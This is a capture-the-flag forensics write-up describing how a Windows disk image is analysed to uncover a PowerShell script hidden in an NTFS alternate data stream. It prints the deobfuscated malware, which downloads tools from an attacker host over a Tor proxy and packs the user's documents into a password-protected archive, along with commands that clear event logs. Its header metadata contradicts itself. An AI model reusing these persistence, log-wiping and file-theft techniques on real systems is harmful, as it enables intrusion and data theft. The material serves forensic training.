# Artifacts of Dangerous Sightings

Category: Forensics
Difficulty: medium
Points: 1000

************Category************: Crypto

****************Points:**************** 425

************************Difficulty:************************ very easy

## Description

Pandora has been using her computer to uncover the secrets of the elusive relic. She has been relentlessly scouring through all the reports of its sightings. However, upon returning from a quick coffee break, her heart races as she notices the Windows Event Viewer tab open on the Security log. This is so strange! Immediately taking control of the situation she pulls out the network cable, takes a snapshot of her machine and shuts it down. She is determined to uncover who could be trying to sabotage her research, and the only way to do that is by diving deep down and following all traces …

## Walkthrough

### File Analysis

The provided file, **2023-03-09T132449_PANDORA.vhdx**, is a Windows-formatted Virtual Hard Disk. In Linux, we can mount it like this:

```python
sudo rmmod nbd
sudo modprobe nbd max_part=16
sudo qemu-nbd -c /dev/nbd0  2023-03-09T132449_PANDORA.vhdx
sudo mount -t ntfs -o loop,ro,show_sys_files,stream_interface=windows /dev/nbd0p1 /mnt/Windows/
```

So supposedly, Pandora found weird things in the security log. We can use **dumpevtx**  to parse the file and see if anything interesting comes up. I checked the file for a bunch of string, and found something interesting related to powershell:

```python
dumpevtx parse /mnt/Windows/C/Windows/System32/winevt/logs/Security.evtx > Security.txt
cat Security.txt | grep -i power
#"CommandLine": "sc  create WindowssTask binPath= \"\\\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\\\" -ep bypass - \u003c C:\\Windows\\Tasks\\ActiveSyncProvider.dll:hidden.ps1\" DisplayName= \"WindowssTask\" start= auto"
```

The script hidden.ps1 is being executed as a **Task**. HOWEVER, the powershell logs are empty, so we can check if **ConsoleHost_history.txt** file exits

```python
find /mnt/Windows/C/Users -name 'ConsoleHost_history.txt'
#/mnt/Windows/C/Users/Pandora/AppData/Roaming/Microsoft/Windows/PowerShell/PSReadline/ConsoleHost_history.txt
cat /mnt/Windows/C/Users/Pandora/AppData/Roaming/Microsoft/Windows/PowerShell/PSReadline/ConsoleHost_history.txt
```

And this is the output, so the 'finpayload' was injected to ActiveSyncProvider.dll, and then all the PowerShell logs were deleted 🥲.

```python
type finpayload > C:\Windows\Tasks\ActiveSyncProvider.dll:hidden.ps1
exit
Get-WinEvent
Get-EventLog -List
wevtutil.exe cl "Windows PowerShell"
wevtutil.exe cl Microsoft-Windows-PowerShell/Operational
Remove-EventLog -LogName "Windows PowerShell"
Remove-EventLog -LogName Microsoft-Windows-PowerShell/Operational
Remove-EventLog
```

We can copy **ActiveSyncProvider.dll** to our working directory and try to extract the Powershell script.

```python
cp /mnt/Windows/C/Windows/Tasks/ActiveSyncProvider.dll .
```

I tried a bunch of things, until I realized that I had to execute stuff on the file in the mount point directly, since it's an alternate data stream. Hidden.ps1 contains a huge base64 encoded command, which I copy in my shell and directly decode, but some of the strings fail to decode properly. Eventually, I found that decoding the string in powershell, and saving it as an array is best for 'preservation' and limits the corruption of the data.

### Code Analysis

```python
cat /mnt/Windows/C/Windows/Tasks/ActiveSyncProvider.dll:hidden.ps1 > hidden.ps1 

#in pwsh
$file = "hidden.ps1"
[System.Convert]::FromBase64String((Get-Content $file)) | Set-Content output.bin
```

Then, I decode it in python, before re-parsing it in powershell :))))

```python
fp = open('output.bin').readlines()
fp = [int(i.strip()) for i in fp if int(i.strip()) != 0]

with open('dec.ps1','wb') as of:
 of.write(bytes(fp))
```

The file is a PAINFUL obfuscated script 😭. The last part of the line (since there's only one super long line lol ) has '|', so I wonder if I copy the part without '|', set it as a variable, and try to echo it in powershell. IT does work, but it returns a bunch of '[Char]' + integer . So, we must decode it again. I copy paste everything until the last '|', and this time, I get the code, and flag !

```python
function makePass
{
    $alph=@();
    65..90|foreach-object{$alph+=[char]$_};
    $num=@();
    48..57|foreach-object{$num+=[char]$_};

    $res = $num + $alph | Sort-Object {Get-Random};
    $res = $res -join '';
    return $res;
}

function makeFileList
{
    $files = cmd /c where /r $env:USERPROFILE *.pdf *.doc *.docx *.xls *.xlsx *.pptx *.ppt *.txt *.csv *.htm *.html *.php;
    $List = $files -split '\r';
    return $List;
}

function compress($Pass)
{
    $tmp = $env:TEMP;
    $s = 'https://relic-reclamation-anonymous.alien:1337/prog/';
    $link_7zdll = $s + '7z.dll';
    $link_7zexe = $s + '7z.exe';

    $7zdll = '"'+$tmp+'\7z.dll"';
    $7zexe = '"'+$tmp+'\7z.exe"';
    cmd /c curl -s -x socks5h://localhost:9050 $link_7zdll -o $7zdll;
    cmd /c curl -s -x socks5h://localhost:9050 $link_7zexe -o $7zexe;

    $argExtensions = '*.pdf *.doc *.docx *.xls *.xlsx *.pptx *.ppt *.txt *.csv *.htm *.html *.php';

    $argOut = 'Desktop\AllYourRelikResearchHahaha_{0}.zip' -f (Get-Random -Minimum 100000 -Maximum 200000).ToString();
    $argPass = '-p' + $Pass;

    Start-Process -WindowStyle Hidden -Wait -FilePath $tmp'\7z.exe' -ArgumentList 'a', $argOut, '-r', $argExtensions, $argPass -ErrorAction Stop;
}

$Pass = makePass;
$fileList = @(makeFileList);
$fileResult = makeFileListTable $fileList;
compress $Pass;
$TopSecretCodeToDisableScript = "HTB{Y0U_C4nt_St0p_Th3_Alli4nc3}"
```

************Flag:************ HTB{Y0U_C4nt_St0p_Th3_Alli4nc3}